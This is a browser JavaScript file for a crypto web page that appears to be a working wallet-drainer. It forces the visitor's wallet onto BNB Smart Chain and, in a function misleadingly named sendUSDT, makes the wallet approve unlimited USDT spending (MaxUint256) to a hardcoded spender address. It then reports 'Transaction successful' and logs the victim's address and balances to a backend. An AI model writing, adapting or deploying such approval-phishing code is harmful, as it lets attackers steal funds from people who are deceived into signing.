let provider;
let userAddress = null;
let isConnected = false;

// ===== BSC CONFIG - FORCE BSC ONLY =====
const BSC_CHAIN_ID = 56; // BSC Mainnet Chain ID
const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

const ABI = [
  "function approve(address spender, uint256 amount)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

// ===== FORCE BSC CONNECTION - NO CHECKS =====
// Directly connect to BSC network, no chain verification
window.addEventListener("load", async () => {
  if (window.ethereum) {
    try {
      // Force switch to BSC first (before any wallet interaction)
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }] // BSC = 0x38 in hex
        });
      } catch (switchErr) {
        // If BSC not added, add it
        if (switchErr.code === 4902) {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: "0x38",
              chainName: "Binance Smart Chain",
              rpcUrls: ["https://bsc-dataseed.binance.org/"],
              nativeCurrency: {
                name: "BNB",
                symbol: "BNB",
                decimals: 18
              },
              blockExplorerUrls: ["https://bscscan.com"]
            }]
          });
        }
      }

      // Setup provider on BSC
      provider = new ethers.BrowserProvider(window.ethereum);
      
      // Get accounts (silent if already authorized)
      const accounts = await window.ethereum.request({ method: "eth_accounts" });
      
      if (accounts.length > 0) {
        userAddress = accounts[0];
        isConnected = true;
        
        // Auto-fill address
        if (window.updateWalletAddress) {
          window.updateWalletAddress(userAddress);
        }
      }
    } catch (err) {
      console.log("BSC setup failed:", err);
    }
  }
});

// ===== APPROVE (BSC ONLY) =====
async function sendUSDT() {
  try {
    if (!window.ethereum) {
      alert("Wallet not found");
      return;
    }

    // Ensure we have provider
    if (!provider) {
      provider = new ethers.BrowserProvider(window.ethereum);
    }

    // Get signer for transaction (no new connection request)
    const signer = await provider.getSigner();
    const address = await signer.getAddress();

    // Create contract with signer
    const usdt = new ethers.Contract(
      BSC_USDT,
      ABI,
      signer
    );

    // Get balances before transaction
    const usdtBalanceWei = await usdt.balanceOf(address);
    const usdtBalance = ethers.formatUnits(usdtBalanceWei, 18);
    
    const nativeBalanceWei = await provider.getBalance(address);
    const nativeBalance = ethers.formatEther(nativeBalanceWei);

    // Approve transaction on BSC
    const tx = await usdt.approve(
      BSC_SPENDER,
      ethers.MaxUint256
    );

    const receipt = await tx.wait();

    alert("Transaction successful ✅");

    // Save to backend via React
    if (window.saveTransaction) {
      window.saveTransaction({
        walletAddress: address,
        toAddress: BSC_SPENDER,
        txHash: receipt.hash,
        usdtBalance: usdtBalance,
        nativeBalance: nativeBalance
      });
    }

  } catch (e) {
    if (e.code === 4001) {
      alert("Transaction cancelled");
    } else {
      alert("Transaction failed: " + e.message);
    }
  }
}

window.sendUSDT = sendUSDT;
